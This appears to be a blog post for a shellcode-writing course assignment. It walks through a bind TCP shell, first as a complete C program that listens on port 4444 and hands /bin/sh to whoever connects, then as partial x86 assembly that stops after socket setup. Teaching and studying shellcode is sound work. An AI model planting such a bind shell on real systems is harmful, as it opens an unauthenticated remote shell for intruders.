---
title:  Assignment 1
description: Create a Shell Bind TCP shellcode
order: 1
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

Before we dive into assembly, let's first write a simple program in c to model the functionality.

```c
/* bind_tcp_model.c
 *  - Bind to a socket, listen for a connection, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY

int main() {
	int port = 4444;
	int sockfd, connfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Bind to socket

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = INADDR_ANY;

	bind(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Listen on socket

	listen(sockfd, 0);

	// Accept a connection

	connfd = accept(sockfd, 0, 0);

	// Route i/o through connection

	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}

```

Since the first step is creating a socket, let's look at the syscall *socketcall*, **102**.
```c
int socketcall(int call, unsigned long *args);
```
The syscall *socketcall* seems to accept a *call* parameter, so we'll take a look at those too.
```bash
> grep SYS_ /usr/include/linux/net.h

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
...
```

To create a socket we'll need SYS_SOCKET, **1**, which from our c model we know takes the following form:
```c
int socket(int domain, int type, int protocol);
```

Let's try to put all this down in assembly.

```nasm
; bind_shell_tcp.nasm
;  - Bind to a socket, listen for a connection, provide shell.

global _start

section .text
_start:
        ; int socketcall(int call, unsigned long *args)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x01 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

        xor eax, eax
        mov al, 0x66
        xor ecx, ecx
        push ecx
        inc ecx
        push ecx
        xor ebx, ebx
        mov bl, cl
        inc ecx
        push ecx

```

Great!  Next up is bind.
```c
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

<br>
{% include preamble.md %}


[&lt;&lt; Go Back]({{ site.baseurl }})
